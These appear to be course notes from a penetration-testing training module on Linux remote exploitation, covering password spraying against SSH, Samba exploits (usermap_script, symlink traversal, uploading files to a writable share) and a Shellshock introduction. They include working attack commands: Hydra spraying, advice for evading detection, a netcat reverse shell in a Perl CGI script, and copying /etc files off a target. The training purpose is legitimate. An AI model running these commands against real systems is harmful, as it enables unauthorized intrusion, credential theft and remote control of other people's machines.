# [ECPPT](https://members.elearnsecurity.com/courses/penetration_testing_professional_v5)
__________________________
# Linux Exploitation
# Module 2 - Information Gathering

https://cdn.members.elearnsecurity.com/ptp_v5/section_4/module_3/html/index.html

###### Module Map
1. Password Spray Attack
2. Exploiting Samba
3. Exploiting Shellshock
4. Exploiting Heartbleed
5. Exploiting Java RMI Registry
6. Exploiting Java Deserialization
7. Exploiting Tomcat
8. Remote Exploitation - Conclusion

___________________________________
## 3.1. Password Spray Attack
Password Spray Attacks have quickly gained popularity as a *go-to* method for gaining access to systems via dictionary attacks due to its success-rate in the wild.

Rather than the usual dictionary brute force methods involving a dictionary of hundred of not millions of password entries, the idea is to reverse the process, and instead, introduce a list of as many *users* as possible, while trying just a *single password attempt* against tens or hundreds of user accounts.

This method reduces the potential of account lockouts and in some cases, allow us to stay *under the radar* when attempting single passwords against many users.

This method may also see referred to as [Reverse Brute-Force Attack](https://en.wikipedia.org/wiki/Brute-force_attack#Reverse_brute-force_attack)

To successfully execute a password spray attack, we must first gather as many usernames as possible in regard to our target organization or target system.
  This can be done in several ways, as we've  seen in the information gathering and enumeration sections.

  For this module, we'll use the SMTP method of enumerating users in addition to utilizing [Statistically Likely Usernames](https://github.com/insidetrust/statistically-likely-usernames) lists in order to compile an initial list of users, along with any usernames we have already gathered from other phases of engagement.

  Also, remember that we can use tools such as [The Harvester](https://github.com/laramies/theHarvester) to get an idea of user naming conventions organizations are using for their users.

  Utilizing more than one tool to help compile an initial user list will only help us in our quest.

In the information gathering phase, we saw that there are several tools and services which we can use to accomplish our user enumeration tasks. For enumerating SMTP users, we covered [smtp-user-enum](http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum) and also several manual methods (VRFY, EXPN, etc).

Metasploit also contains an auxiliary scanner module known as [smtp_enum](https://www.rapid7.com/db/modules/auxiliary/scanner/smtp/smtp_enum) which we'll use for this purpose this time around.

  First, we'll need to create our initial user list. We can quickly create a list of fifty users with the following command, where `john.txt` is taken directly from the [Statistically Likely Usernames](https://github.com/insidetrust/statistically-likely-usernames) list:
    ```
    head -n 50 john.txt >> users.txt
    ```
    ```
    root@tester:~/tools# cat users.txt
    bob
    root
    sara
    john
    michael
    david
    chris
    mike
    james
    mark
    jason
    <...snip>
    ```

  Once we've created our initial list of users, combined with users we've gathered from other phases of testing, we can execute our enumeration process using the Metasploit [smtp_enum](https://www.rapid7.com/db/modules/auxiliary/scanner/smtp/smtp_enum) module against our target SMTP server:
    ```
    msf > use auxiliary/scanner/smtp/smtp_enum
    ```

    We'll then set our `RHOST` value to that of the SMTP server IP address, and also set the `USER_FILE` value to that of our `users.txt` file and run the module:
      ```
      msf auxiliary(scanner/smtp/smtp_enum) > set RHOST 192.168.13.21
      RHOSTS => 192.168.13.21
      msf auxiliary(scanner/smtp/smtp_enum) > set USER_FILE users.txt
      USER_FILE -> users.txt
      msf auxiliary(scanner/smtp/smtp_enum) > run

      [*] 192.168.13.21:25 - 192.168.13.21:25 Banner: server2 ESMTP Sendmail 8.15.2/8.15.2/Debian-9;
      Fri, 12 Jan 2018 16:33:31 -0500; (No UCE/UBE) logging access from: tester.localdomain(OK)-tester.localdomain [192.168.13.18]
      ```

    When the scanner completes (which may take several minutes depending on how many users are in our list), we can see that we've validated several users that we can use for our password spray attack:
      ```
      [+] 192.168.13.21:25      - 192.168.13.21:25 Users found: amanda, bob, brian, chris, david, james, jason, jeff, jennifer, jessica, michael, robert, sara
      ```

    From the output above, we can now create a list of validated users.
    Add those to your `valid_users.txt` file, (one on each line) with any others you may have validated during information gathering.

    Note:<br>
      The more users we can validate, the higher probability that our password spray attack will succeed; so aim to create as large a list as possible, of validated users accounts.

  Now that we have validated some users, we should determine one (recommended) or two (max) commonly-used passwords we can use for our attack.
    Regarding commonly used passwords, real-world experience has shown that one of the most commonly used passwords are usually found to be the current season, along with the current year, e.g., `Spring2018`

      You'll be surprised at how many times you will come across multiple users, within the same environment, using the same exact password in the `Season[Year]` format.

      Use this lack of configuration of password complexity and human nature to choose easy-to-remember passwords to your advantage.

      Another very common password is `CompanyName[Number]`, e.g., FooCorp01, FooCorp02, etc.

    For our password list, we'll start with just using `Spring2018` as it's very common.
      Use your imagination when picking a password that related to your target in some way or another.

      In environments where password complexity is not enabled, (a common observation in Linux-based networks), users will take advantage of using easy-to-remember password that they'll modify by simply changing a value or other characteristic over time, e.g., *Password01* to *Password02* or *Summer2018* to *Fall2018*.

      From month to month, season to season, making minor modifications to their passwords, will be enough to please the systems' password policy.

      Also, keep in mind that password re-use is also a frequent issue, and passwords may be reused across systems within an environment.

  Now that we have a list of users we've validated, and a list containing 2 very common passwords, we can start our password spray attack against other services on our target machine.
     First, let's determine some other services that are listening on our target system that we can execute a password spray attack against.

     We'll use Nmap for that:
      ```
      nmap -sT 192.168.13.21 --open --max-retries 1 -n
      ```
      ```
      Nmap scan report for 192.168.13.21
      Host is up (0.00075s latency).
      Not shown: 992 closed ports
      PORT      STATE   SERVICE
      22/tcp    open    ssh
      25/tcp    open    smtp
      80/tcp    open    http
      111/tcp   open    rpcbind
      139/tcp   open    netbios-ssn
      445/tcp   open    microsoft-ds
      587/tcp   open    submission
      2049/tcp  open    nfs
      MAC Address: 00:0C:29:37:8B:DB (VMWare)

      Nmap done: 1 IP_address (1 host up) scanned in 0.34 seconds
      ```

      From the output, we can determine that there are several services we can execute our password spray attack against; SSH, SMTP, and SMB, as they all utilize some form of authentication or another.

      For this lesson, we'll pick SSH, just to demonstrate that we can use one particular service, in this case, SMTP, to enumerate for valid users that we can then use to attack an unrelated service, SSH in this case.

      To summarize our activities up to this point:
      1. We've created a list of users gathered through our information gathering phase, in addition to using usernames form the Statistically Likely Usernames list
      2. We've confirmed valid users using SMTP users enumeration with the `smtp_enum` Metasploit scanner module
      3. We've created our list of validated user accounts, and a list containing 2 commonly-used passwords
      4. We've determined several services on our target machine we can execute our password spray attack against and have decided on SSH

  Now that all of those pieces are in place, we can execute password spray attack against the SSH service.
    For this, we'll use [THC-Hydra](https://github.com/vanhauser-thc/thc-hydra), a well-known and tested brute-force tool.

    With Hydra, we can supply our list of users (`-L`), our password list (`-P`), and specify the service we'd like to attack (`ssh`), with a command line similar too the following:
      ```
      hydra -L users.txt -P passwords.txt ssh://192.168.13.21
      ```
      ```
      Hydra v8.6 (c) 2017 van Heuer/THC - Please do not use in military or secret service organizations, or for illegal purposes.

      [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
      [DATA] max 16 tasks per 1 server, overall 16 tasks, 22 login tries (1:11/p:2), ~2 per task
      [DATA] attacking ssh://192.168.13.21:22/
      [22][ssh] host: 192.168.13.21 login: david    password: Spring2018
      1 of 1 target successfully compleetd, 1 valid pasword found
      ```

      From the Hydra output above, we can see we successfully cracked the `david` account with the `Spring2018` password.

  Once we've obtained valid credentials for a single user, we can also exploit the common case of *password reuse* within an environment.
    Using the obtained credentials, we can then use those to attempt to log in to other SSH-enabled machines as our `david` user.

    This often results in access to multiple systems which can then be used as pivots to other areas of the network or to maintain multiple footholds, etc.

    Of course, this can also be done with Hydra, and in a single sweep, we can determine other systems on the network, which allow access using the same credentials we've cracked. We would use the `-M` parameter to specify a list of ssh servers. Something like the following:
      ```
      hydra -l david -p Spring2018 -M ssh_servers.txt ssh
      ```
      Where `ssh_servers.txt` is a file containing your SSH target servers, one per line.

In addition to trying your password spray attack against the SSH service, we encourage you to also experiment with brute forcing SMB, or any other listening services that accept user credentials if found as well.
  Metasploit [smb_login](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_login) scanner module can be used to obtain similar results for password spray attacks against SMB services.

Aside from targeting Linux-based systems with password spray attacks, the same concept is, of course, valid for any type of environment or platform, as long as the service provides a means to authenticate to it.

With that said, password spray attacks are also known to be very successful against platforms such as Outlook Web Access or Exchange Portals.
  We encourage you to try this attack using Metasploit's [owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login) brute force module on OWA portals you are authorized to test against for great results using the Password Spray method.

**A Word of Caution**
Depending on system configurations, Password Spray attacks can be detected and thwarted, which is why it is crucial to only attempt 1 or 2 passwords during a single run.

Take extra care that whichever tool you're using isn't trying blank passwords or other variations in addition to whatever is in you password list.

This would add to the authentication attempts and likely result in account lockouts, or detection by a SIEM or other anomalous event detection solution.

Furthermore, after attempting a password spray attack run, if unsuccessful the first time around, wait 45 minutes and try again with new passwords in your list.

Multiple attempts within a certain time-range can also result in detection and/or lockouts.


___________________________________
## 3.2. Exploiting Samba
[Samba](https://en.wikipedia.org/wiki/Samba_(software)), as encountered previously in Information Gathering, is quite commonly found within Linux-based environments, as it typically provides file sharing services to both Windows, and Linux users.

It is also a ripe target when configured incorrectly, and versions up to 4.6.4. contain vulnerabilities that allow an attacker to take control of an affected server completely, this was most recently seen with [CVE-2017-7494](http://cve.circl.lu/cve/CVE-2017-7494), sometimes referred to as *SambaCry*.

For this portion of the lesson, we are going to focus on three different attack vectors affecting different versions and of varying configurations of Samba, and on different systems.

It will be important that we identify the exact versions of Samba, as well as identify vulnerabilities that exist in either the versions or configurations, and then exploitation of the systems.

Steps:
  The first task requires identifying that Samba is installed on the system, and furthermore, identifying the version of Samba.
    This can be accomplished with a nmap [smb-os-discovery](https://nmap.org/nsedoc/scripts/smb-os-discovery.html) script scan for port 445:
      ```
      nmap --script smb-os-discovery -p445 192.168.13.29
      ```
      ```
      Nmap scan report for server3 (192.168.13.29)
      Host is up (0.00048s latency).

      PORT      STATE   SERVICE
      445/tcp   open    microsoft-ds
      MAC Address: 00:0C:29:ED:4B:92 (VMWare)

      Host script results:
      | smb-os-discovery:
      |   OS: Unix (Samba 3.0.20-Debian)
      |   NETBIOS computer name:
      |   Workgroupu: WORKGROUP\x00
      |_  System time: 2018-01-19T20:59:15-05:00

      Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds
      ```
      As we can see from the above scan output, we've identified a Samba version of *3.0.20*

  Once the version of Samba is known, we can start to investigate exactly which vulnerabilities might be present for that particular version.
    [searchsploit](https://www.exploit-db.com/searchsploit/) is an excellent tool for this, and allows us to search all vulnerabilities for a particular software directly from the Linux command line.
      Searchsploit is a local database of all exploits that can also be found at http://www.exploit-db.com/

      Knowing that the Samba version we are looking for is 3.0.20, we can execute the following `searchsploit` command, to find vulnerabilities related to it:
        ```
        # searchsploit samba 3.0.20
        ```
        ```
        root@tester:~# searchsploit samba 3.0.20
        -------------------------------------------------------------------
          Exploit Title

        -------------------------------------------------------------------
        Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
        Samba < 3.0.20 - Remote Heap Overflow
        ```

        From our `searchsploit` results, we can see that we have a potential vulnerability candidate (Username map script Command Execution), and additionally, the (Metasploit) indicator tells us that there is a Metasploit module for it as well. Let's see if we can exploit it.

#### 3.2.1 The Username Map Script vulnerability (CVE-2007-2447)
      The [Username Map Script](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script) vulnerability ([CVE-2007-2447](https://www.samba.org/samba/security/CVE-2007-2447.html)), discovered in 2007 by an anonymous researcher, affects Samba versions `3.0.0` through `3.0.25rc3` and exists in non-default configurations where the *username map script* option is enabled, which results in remote command execution and compromise of the affected server. More in [here](https://www.samba.org/samba/security/CVE-2007-2447.html).

      Exploiting the [Username Map Script]() is rather straightforward, only requiring a couple of options in the Metasploit module configuration.
        First, we load the exploit module
          ```
          msf> use exploit/multi/samba/usermap_script
          ```
        Then we set our `RHOST` value for our target
          ```
          msf exploit(multi/samba/username_script) > set RHOST 192.168.13.29
          ```
        Then our `LHOST` value for our attacker machine, where the exploit will call back to:
          ```
          msf exploit(multi/samba/username_script) > set LHOST 192.168.13.18
          ```
        Finally, we should be able to run our exploit
          ```
          msf exploit(multi/samba/usermap_script) > exploit

          [*] Started reverse TCP double handler on 192.168.13.18:4444
          [*] Accepted the first client connection...
          [*] Accepted the second client connection...
          [*] Command: echo Ico6BGCor4gLjPhR;
          [*] Writing to Socket A
          [*] Writing to Socket B
          [*] B: "Ico6BGCor4gLjPhR\r\n";
          [*] Matching...
          [*] A is input...
          [*] Command shell session 2 opened (192.168.13.18:4444 -> 192.168.13.29:37702)
          ```
        Once the exploit is completed, and we have a Command Shell session, we can immediately start interacting with it, and executing commands:
          ```
          [*] Command shell session 3 opened (192.168.13.18:4444 -> 192.168.13.29:47822) at

          id
          uid=0(root) gid=0(root)
          uname -a
          Linux server3 2.6.24-16-server #1 SMP Thu Apr 16:58:00 UTC 2008 i686 GNU/Linux
          ```

          In this particular instance, we are UID 0 (root), and therefore have full control over the system. The next logical progression would be to start post-exploitation tasks, which will be covered in detail in later modules.

          Something you may have noticed once we got our shell, is that we are not presented with an interactive `/bin/sh` prompt, e.g., (`sh-3.2#`).
            We can remedy this by launching a simple Python one-liner to give us a proper PTY (Pseudo TTY):
              ```
              python -c 'import pty; pty.spawn("/bin/sh")'
              ```
            As you can see, once we run our python `pty.spawn` one-liner, we are presented with a `/bin/sh` prompt.

#### 3.2.2. Samba Symlink Directory Traversal
Another vulnerability which is a result of a particular misconfiguration in Samba, but sometimes catastrophic consequences is known as the [Samba Symlink Directory Traversal](https://www.samba.org/samba/news/symlink_attack.html) vulnerability.

The vulnerability essentially allows an attacker to create a symbolic link to the root (/) partition from a writeable share ultimately allowing for read access to the entire file system outside of the share directory.

Although this vulnerability can be exploited using a modified `smbclient`, Metasploit contains a [module](https://www.rapid7.com/db/modules/auxiliary/admin/smb/samba_symlink_traversal) for exploitation, so we'll use that for our purposes.

  A pre-requisite to this particular vulnerability requires that the samba server contains a writeable share and that the `widelinks` parameter in the `smb.conf` file is set with a value of `yes`. We can use the following `smbmap` command to dtermine shares available to us on a Samba server
    ```
    smbmap -H 192.168.13.29
    ```
    ```
    [+] Finding open SMB ports...
    [+] User SMB session established on 192.168.13.29...
    [+] IP: 192.168.13.29:445       Name: server3

            Disk                                Permissions
            ----                                -----------
            print$                              NO ACCESS
            tmp                                 READ, WRITE
            opt                                 NO ACCESS
            IPC$                                NO ACCESS
            ADMIN$                              NO ACCESS
    ```
    Description : `tmp` share's WRITE access identified

  Once we have determined that a writeable share is available, in this case `tmp`, we can use Metasploit's [samba_symlink_traversal](https://www.rapid7.com/db/modules/auxiliary/admin/smb/samba_symlink_traversal) auxiliary module to create the symlink to the root filesystem
    Several options are required as seen below:
    ```
    msf auxiliary(admin/smb/samba_symlink_traversal) > show options

    Module options (auxiliary/admin/smb/samba_symlink_traversal):

      Name      Current Setting   Required   Description
      ----      ---------------   --------   -----------
      RHOST     192.168.13.29     yes        The target address
      RPORT     445               yes        The SMB service port (TCP)
      SMBSHARE  tmp               yes        The name of writeable share on the server
      SMBTARGET rootfs            yes        The name of the directory that should point to the root filesystem
    ```

    As seen in the above screenshot, we set out `RHOST` value to that of our target server, we can leave the `RPORT` as-is, and we also need to specify the name of the writeable share, which is `tmp` in this instance. We can also leave the `SMBTARGET` set to its default.

    Once this is complete, we can run our module.
      ```
      msf auxiliary(admin/smb/samba_symlink_traversal) > run
      [+] 192.168.1.29:445 - Connecting to the server...
      [+] 192.168.1.29:445 - Trying to mount a writeable share 'tmp'...
      [+] 192.168.1.29:445 - Trying to link 'rootfs' to the root filesystem...
      [+] 192.168.1.29:445 - Now access the following share to browse the root filesystem:
      [+] 192.168.1.29:445 -        \\192.168.13.29\tmp\rootfs

      [+] Auxiliary module execution completed
      ```

      We can see from the above output, that a new `rootfs` directory has been created within the `tmp` share.

    Our next step is to use `smbclient`, as we have seen from previous sections, to access the share, change into the `rootfs` directory, and download or upload files to the system where and if possible.
      We can do this with the following command:
      ```
      smbclient \\\\192.168.13.29\\tmp -N
      ```
      ```
      WARNING: The "syslog" option is deprecated
      Anonymous login successful
      Try "help" to get a list of possible commands.
      smb: \> ls
        .                 D       0   Sat Jan 20 08:37:48 2018
        ..                DR      0   Mon Jan 15 20:29:56 2018
        .ICE-unix         DH      0   Sat Jan 20 06:51:38 2018
        .X11-unix         DH      0   Sat Jan 20 06:52:03 2018
        -X8-lock          DR     11   Sat Jan 20 06:52:03 2018
        5163.jsvc_up      R       0   Sat Jan 20 06:52:19 2018
        rootfs            DR      0   Mon Jan 15 20:29:56 2018
      smb: \>
      ```

    From here, we can simply use `smbclient` to change into the `rootfs` directory, and begin post exploitation, downloading/uploading files, etc. using the `smbclient` `get` and `put` commands:
      ```
      smb: \> cd rootfs
      smb: \rootfs\> cd etc
      smb: \rootfs\etc\> get passwd
      getting file \rootfs\etc\passwd of size 1612 as passwd
      1574.2 KiloBytes/sec)
      smb: \rootfs\etc\>
      ```
      `\rootfs\etc\passwd` is saved as `passwd` in your PC

      ```
      root@tester:~# less passwd
      ```
      ```
      root:x:0:0:root:/root:/bin/bash
      daemon:x:1:1:daemon:/usr/sbin:/bin/sh
      bin:x:2:2:bin:/bin:/bin/sh
      ...
      ```

      Additionally, another useful command for data exfiltration when conducting post-exploitation tasks using `smbclient` is the `tar` command.
        With the `tar` command, we can create an archive of all files within a current directory, for local use later.
          ```
          smb: \rootfs\tmp\rootfs\> cd etc
          smb: \rootfs\tmp\rootfs\etc\> tar c ../tmp/all_files.tar *
          ```
        The above will create a tar archieve of the `/etc/` directory on the target system to our local systems' `/tmp` directory
          ```
          root@tester:/tmp# ls -als all_files.tar
          34904 -rw-r--r-- 1 root root 35738624 Jan 12 14:22 all_files.tar
          ```
        We can then extract, and start enumerating files for sensitive content, passwords, etc
          ```
          root@tester# tar xf /tmp/all_files.tar
          root@tester# cd /tmp/rootfs/tmp/rootfs/etc
          root@tester# grep -r "password" * 2>&1 /dev/null
          ```
          ```
          php2/apache2/php.ini:; file will be able to reveal password as well
          php2/apache2/php.ini:;mysql.default password = My!SQLP@ssw0rd!
          php2/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode)
          ```
        We will cover post-exploitation tasks such as the above in greater detail in the later module.

#### 3.2.3. Writeable samba Share to Remote Command Execution via Perl Reverse Shell
Now what we have seen how we can exploit known vulnerabilities in either configuration issues, or vulnerable versions of samba.

This final segment on Samba Exploitation will cover what we can do in certain situations where we have a fully patched Samba server, but have a writeable share available to us, and can exploit that scenario for remote command execution, in this case, a reverse shell.

In this scenario, we discover that a server we have enumerated is running a patched Samba server, and contains a share named `www`, which appears to be possibly configured to allow administrators to easily update an internal web application.

Using our previous checks for Samba version and available shares using the Nmap [smb-os-discovery](https://nmap.org/nsedoc/scripts/smb-os-discovery.html) NSE script, and [smbmap](https://github.com/ShawnDEvans/smbmap), we have determined OS and Samba Version:
  ```
  nmap --script smb-os-discovery 192.168.13.21 -p 445
  ```
  ```
  Nmap scan report for server3 (192.168.13.29)
  Host is up (0.00046s latency).

  PORT      STATE   SERVICE
  445/tcp   open    microsoft-ds
  MAC Address: 00:0C:29:37:8B:DB (VMWare)

  Host script results:
  | smb-os-discovery:
  |   OS: Windows 6.1 (Samba 4.7.3-Debian)
  |   Computer name: server2
  |   NETBIOS computer name: SAMBASRV\x00
  |   Domain name: \x00
  |   FQDN: server2
  |_  System time: 2018-01-20T16:53:31-05:00
  ```

We also have determined any shares that are available to us, as well as seeing that Guest sessions to the shares are possible as well:
  ```
  smbmap -H 192.168.13.21
  ```
  ```
  root@tester:~# smbmap -H 192.168.13.21
  [+] Finding open SMB ports....
  [+] Guest SMB session established on 192.168.13.21...
  [+] IP: 192.168.13.21:445     Name: server2
          Disk                                                Permissions
          ----                                                -----------
          www                                                 READ, WRITE
          print$                                              NO ACCESS
          IPC$                                                NO ACCESS
  ```
  Description: `www` is shared with `READ` and `WRITE` access

This finding is good news for us for a couple of reasons:
1. Web roots often contain files specific to a web server configuration, and can furthermore be used to obtain credentials tot other services, e.g., MySQL
2. Being able to *write* to a web root, is even better depending on the web server configuration.
  For example:
  - Is PHP installed?
  - Are there any other web server-interpreted languages we can use to our advantage?
  - Can we upload any files to this directory, and how will the web server handle our files?
  - Can we exploit that to obtain remote command execution?

Our first task is to connect to the share, and have a look at its content, and secondly, we'll want to determine if the Samba server has any HTTP ports listening, which might be serving contents to share.
  Again, we'll use `smbclient` to connect and have a look at any files within the `www` share. We can connect to the share with `smbclient` and execute the Linux `ls` command to list files within the directory
    ```
    root@tester:~# smbclient \\\\192.168.13.21\\www -N
    WARNING: The "syslog" option is deprecated
    Try "help" command to get a list of possible commands.
    smb: \> ls
      .                 D       0   Sat Jan 20 08:37:48 2018
      ..                DR      0   Mon Jan 15 20:29:56 2018
      index.pl          D       0   Sat Jan 20 08:37:48 2018

    smb: \>
    ```
    As the image above explains, the presence of a `.pl` extension indicates that the server is likely configured to process Perl (CGI) programs.

  We can download the `index.pl` file with the `get` command, and take a look at its contents; perhaps we can gain some insight as to its purpose or function
    ```
    smb: \> get index.pl
    getting file \index.pl of size 283 as index.pl (2.6 KiloBytes/sec) (average 2.6 KiloBytes/sec)
    smb: \>
    ```

    Looking at the file, we can determine that `index.pl` is a script that simply prints some environment variables regarding the web server configuration as well as confirming that the server is also interpreting Perl scripts.
      ```
      #!/usr/bin/perl

      print "Content-type:text/html\n\n";
      print <<EndOfHTML;
      <html><head><title>Perl Environment Variables</title></head>
      <body>
      <h1>Perl Environment Variables</h1>
      EndOfHTML

      for each $key (sort(keys %ENV)) {
        print "$key = $ENV{$key}<br>\n";
      }

      print "</body></html>"
      ```

We now know it's likely configures to process CGI scripts (Perl), but just to make sure, let's attempt to browse the HTTP port (which we should have discovered about this server during information gathering and enumeration).
  Just to confirm, a quick Nmap scan against the target for open ports, confirms that port 80 is in-fact open:
    ```
    nmap -sT 192.168.13.21 --max-retries 1 -n --open
    ```
    ```
    Nmap scan report for 192.168.13.21
    Host is up (0.00068s latency)
    Not shown: 992 closed ports
    PORT      STATE SERVICE
    22/tcp    open  ssh
    25/tcp    open  smtp
    80/tcp    open  http
    111/tcp   open  rpcbind
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    587/tcp   open  submission
    2049/tcp  open  nfs
    MAC Address: 00:0C:29:37:8B:DB (VMWare)
    ```

  Let's point a browser at our target, to confirm that `index.pl` script in `www` share, is being served by the web server.

We have confirmed that the `www` share configured on the Samba server, is most likely being used to serve the `index.pl` script and is likely the actual web root for the web server.

We also want to make sure that we do in-fat have WRITE permissions to the `www` share; again, we'll do this with `smbclient`, and the `put` command.
  First, let's create a file locally on your attacker system called `test.pl`.
    The contents of this file will execute the `id` Linux system command and will display your current UID and GID information when accessed with your browser.
      **test.pl**
      ```
      #!/usr/bin/perl

      print "Content-type: text/html\n\n"
      system("id");
      ```
  Next, let's connect to the `www` share with `smbclient` and issue the `put` command, along with our `test.pl` file:
    ```
    root@tester:~# smbclient \\\\192.168.13.21\\www -N
    WARNING: The "syslog" option is deprecated
    Try "help" command to get a list of possible commands.
    smb: \> put test.pl
    putting file test.pl as \test.pl (28.3 kb/s) (average 28.3 kb/s)
    smb: \>
    ```
    That was a success. We've confirmed we can upload files to the `www` share.

  Next, let's point a browser to our `test.pl` file on the target system and confirm that the output of the `id` command is printed on the page.
    This will confirm for us that we can upload our own Perl scripts to the server and can execute remote OS commands through our test script (see img-78)

    If all goes well, and we see something similar to the above, we can move onto exploiting the target to obtain a reverse shell.

From this point, we can utilize some tools that have already been written to get us a reverse shell on the system.
  We are going to use a well-known reverse shell Perl script known as [perl-reverse-shell.pl](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell) and can be downloaded from [here](http://pentestmonkey.net/tools/perl-reverse-shell/perl-reverse-shell-1.0.tar.gz)

  If you are using Kali Linux, the script can also be found in the `/usr/share/webshells/perl` directory.

  The script itself will require some minor modifications before we can use it.
  Let's take a quick look at the script, and make sure we are modifying the correct options for our current working environment, especially, our attacker machine IP address, and the port we are going to use for a `netcat` listener to accept the connection.

  We can see on lines `45` and `46`, where we need to make sure that the `$ip` variable set to our attacker machine IP address, and we can choose a port for our `netcat` listener as well. We'll stick with port `1234` for our listener.
    ```
    38 use strict;
    39 use Socket;
    40 use FileHandle;
    41 uses POSIX;
    42 my $VERSION = "1.0";
    43
    44 # Where to send the reverse shell, change these.
    45 my $ip = 192.168.13.18';
    46 my $port = 1234;
    47
    48 # Options
    49 my $daemon = 1;
    50 my $auth = 0; # 0 means authentication is disabled and any
    51               # source IP can access the reverse shell
    52 my $authorized_client_pattern = qr(^127\.0\.0\.1$);
    53
    ```

  Once we've modified the reverse shell Perl script to reflect our attacker IP, we can upload it to the target, the same way we uploaded out `test.pl` file, with `smbclient` and `put`:
    ```
    smb: \> put perl-reverse-shell.pl
    putting file perl-reverse-shell.pl as \perl-reverse-shell.pl
     (1209.6 kb/s) (average 10.1 kb/s)
    smb: \>
    ```
  Before we move forward, first we need to make sure we have our `netcat` up and ready to receive a connection from the target machine.
    `Netcat` can quickly configured to accept remote connections from target systems and provide us with interactive shells relatively quickly.

    It also has other uses, such as transferring files and data exfiltration.

    `Netcat` will also be discussed in more detail in the Post-exploitation modules, but let's continue to our current task.

    To summarize our activities so far, we've:
    1. Uploaded a `test.pl` file to the `www` share and have confirmed we can upload and execute our own Perl scripts on the web server
    2. We've modified the `perl-reverse-shell.pl` script to include our attacker machine IP address, and a port which our `netcat` listener will be configured on and have uploaded it to our target via the `www` share
    3. Next, let's quickly bring up `netcat` listener on our attacker system

    Setting up a `netcat` listener on a specific port is as simple as executing the following command on your attacker system:
      ```
      nc -n -l -v -p 1234
      ```
      At which point, you should see output similar to the following:
      ```
      root@tester:~# nc -nlvp 1234
      listening on [any] 1234 ...
      ```

      Description: (can be combined into `-nlvp`)
      - `-n` : no dns
      - `-l` : listen mode
      - `-v` : verbose
      - `-p` : port we want to listen on (1234)

  Now that we have our `netcat` listener up and ready to accept the incoming connection from our target system, all we need to do next is simply access the reverse shell Perl script we uploaded from a browser on our attacker machine.
    Upon doing that, our `netcat` listener should receive the connection, at which point, we will have a shell on the target.

    Let's try it. (see img-89)

  Alternatively, since we earlier confirmed that the system would execute the `id` command from our `test.pl` script, we could similarly change our script to run a `netcat` reverse shell of we wanted to.
    Our reverse shell Perl script could look similar to the following, and still serve up a bash shell to our `netcat` listener:
      ```
      #!/use/bin/perl

      print "Content-type: text/html\n\n";
      system("nc 192.168.13.18 1234 -e /bin/sh");
      ```
      Description:
      - `-e /bin/sh` to push a shell from the target to our netcat listener

    This demonstrated that there is usually more than one way to achieve our objectives.

Of course, the real work only begins once we have access to a machine, whether it's through a remote exploit, a reverse shell, etc.

Later sections of this course will focus on the steps we can take once we have a shell, maintaining our access through persistence mechanisms, exfiltrating data, moving laterally through an environment, and more.

___________________________________
## 3.3. Exploiting Shellshock
[Shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug)) or *Bashdoor*, disclosed on 24 September 2014, yet another vulnerability that shook the information security industry.

  Within hours of its release, thousands of devices and systems had already been compromised, and botnets were created for the purpose of its exploitation en masse.

  The vulnerability was discovered in the [Unix Bash Shell](https://en.wikipedia.org/wiki/Bash_(Unix_shell)), and affected CGI programs on web servers, OpenSSH, DHCP Clients, and several other attack vectors, e.g., Qmail mail servers, etc.

  The discovery of Shellshock resulted in several CVE's being assigned to different attack vectors:
  - [CVE-2014-6271][https://en.wikipedia.org/wiki/Shellshock_(software_bug)#Initial_report_(CVE-2014-6271)]
  - [CVE-2014-6277][https://en.wikipedia.org/wiki/Shellshock_(software_bug)#CVE-2014-6277]
  - [CVE-2014-6278][https://en.wikipedia.org/wiki/Shellshock_(software_bug)#CVE-2014-6278]
  - [CVE-2014-7169][https://en.wikipedia.org/wiki/Shellshock_(software_bug)#CVE-2014-7169]
  - [CVE-2014-7186][https://en.wikipedia.org/wiki/Shellshock_(software_bug)#CVE-2014-7186]
  - [CVE-2014-7187][https://en.wikipedia.org/wiki/Shellshock_(software_bug)#CVE-2014-7187]

  We encourage you to do additional research regarding the above CVE's, to get a greater understanding of the severity of Shellshock, and the possibilities for exploiting it.

For the purpose of this course, we are going to focus on the CGI attack vector.

___________________________________
## 3.4. Exploiting Heartbleed


___________________________________
## 3.5. Exploiting Java RMI Registry


___________________________________
## 3.6. Exploiting Java Deserialization


___________________________________
## 3.7. Exploiting Tomcat


___________________________________
## 3.8. Remote Exploitation - Conclusion


___________________________________
